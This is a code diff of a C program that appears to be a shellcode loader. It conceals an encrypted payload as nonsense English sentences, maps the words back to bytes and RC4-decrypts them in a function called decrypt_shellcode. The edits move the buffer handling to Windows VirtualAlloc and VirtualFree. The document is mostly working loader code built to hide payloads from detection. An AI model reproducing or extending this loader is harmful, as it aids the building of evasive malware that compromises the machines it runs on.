@@ -38,12 +38,12 @@ static void rc4_init(RC4_State* rc4, const unsigned char* key, size_t key_len) {
 }
 
 static unsigned char rc4_byte(RC4_State* rc4) {
-    rc4->i = (rc4->i + 1) & 0xFF;
-    rc4->j = (rc4->j + rc4->S[rc4->i]) & 0xFF;
+    rc4->i = (rc4->i + 1) % 256;
+    rc4->j = (rc4->j + rc4->S[rc4->i]) % 256;
     unsigned char t = rc4->S[rc4->i];
     rc4->S[rc4->i] = rc4->S[rc4->j];
     rc4->S[rc4->j] = t;
-    return rc4->S[(rc4->S[rc4->i] + rc4->S[rc4->j]) & 0xFF];
+    return rc4->S[(rc4->S[rc4->i] + rc4->S[rc4->j]) % 256];
 }
 
 static char g_words[MAX_WORDS][MAX_WORD_LEN];
@@ -299,7 +299,9 @@ static const char* ciphertext =
 "\n"
 " Nonetheless, than its namely waters otherwise three bucket, coming people initially my rowboat, otherwise year indirectly we. Something bottle packed, partly woke stone say, elsewhere this because. Leather one orange, leather up purple, partly an purple, bottle.";
 
-int main(void) {
+int main(void) 
+{
+
     if (!init_word_mapping(secret_sentence, password)) {
         fprintf(stderr, "Failed to initialize word mapping.\n");
         return EXIT_FAILURE;
@@ -307,20 +309,21 @@ int main(void) {
 
     wait_for_enter("Press <Enter> to allocate ciphertext buffer...\n");
 
-    char* ciphertext_buf = (char*)malloc(strlen(ciphertext) + 1);
+    void* ciphertext_buf = VirtualAlloc(0, strlen(ciphertext) + 1 , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
     if (!ciphertext_buf) {
         fprintf(stderr, "Failed to allocate ciphertext buffer.\n");
         return EXIT_FAILURE;
     }
-    strcpy(ciphertext_buf, ciphertext);
-    printf("[+] Allocated ciphertext buffer at %p\n", (void*)ciphertext_buf);
+    strcpy((char*)ciphertext_buf, ciphertext);
+    printf("[+] Allocated ciphertext buffer at 0x%p\n", ciphertext_buf);
 
     wait_for_enter("Press <Enter> to decrypt payload...\n");
 
     unsigned char* decoded = NULL;
     DecryptStats stats;
-    size_t decoded_len = decrypt_shellcode(ciphertext_buf, &decoded, 0, &stats);
-    free(ciphertext_buf);
+    size_t decoded_len = decrypt_shellcode((char*)ciphertext_buf, &decoded, 0, &stats);
+    VirtualFree(ciphertext_buf, 0, MEM_RELEASE);
     ciphertext_buf = NULL;
 
     if (decoded_len == 0 || decoded == NULL) {
